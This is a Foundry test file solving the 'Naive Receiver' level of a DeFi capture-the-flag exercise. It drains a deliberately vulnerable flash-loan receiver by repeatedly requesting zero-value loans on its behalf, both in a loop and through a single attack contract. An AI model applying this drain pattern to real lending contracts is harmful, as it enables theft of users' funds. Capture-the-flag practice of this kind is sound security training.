// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
import {NaiveReceiverSingleTransaction} from "../../../src/Contracts/naive-receiver/NaiveReceiverSingleTransaction.sol";

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ETHER_IN_RECEIVER = 10e18;

    Utilities internal utils;
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
    FlashLoanReceiver internal flashLoanReceiver;
    NaiveReceiverSingleTransaction internal attackContract;
    address payable internal user;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        vm.label(user, "User");
        vm.label(attacker, "Attacker");

        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        vm.label(address(naiveReceiverLenderPool), "Naive Receiver Lender Pool");
        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);

        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
        assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);

        flashLoanReceiver = new FlashLoanReceiver(
            payable(naiveReceiverLenderPool)
        );
        vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);

        assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);

        //@ctf My Attack Contract
        attackContract = new NaiveReceiverSingleTransaction(payable(naiveReceiverLenderPool));
        vm.label(address(attackContract), "Attack Contract");

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        console.log("Balance of Receiver before LOOP : ", address(flashLoanReceiver).balance);
        vm.startPrank(attacker);
        for (uint256 i; i < address(flashLoanReceiver).balance; i++) // since User contract has 10 ETH, this will run 10 times.
        {
            console.log("iteration number : ", i);

            console.log("Balance of Receiver before flashloan: ", address(flashLoanReceiver).balance);
            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0); // No checks for 0 ETH borrow or No checks if its the owner of user contract calling it, each time flash loan executes
            // the fee is 1 ETH, 10 times will be 10 ETH ultimately draining the User Contract.
            
            console.log("Balance of Receiver after flashloan: ", address(flashLoanReceiver).balance);
        }
        vm.stopPrank();
        console.log("Balance of Receiver after LOOP : ", address(flashLoanReceiver).balance);

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    // Second exploit which does it in one go, Using the new contract I created : NaiveReciverSingleTransaction.sol
    function testExploit2() public {
        /**
         * EXPLOIT START *
         */
        console.log("Balance of Receiver before attack : ", address(flashLoanReceiver).balance);
        vm.startPrank(attacker);
        attackContract.attack(address(flashLoanReceiver)); // calling flashloan in this function
        vm.stopPrank();
        console.log("Balance of Receiver after attack : ", address(flashLoanReceiver).balance);
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}
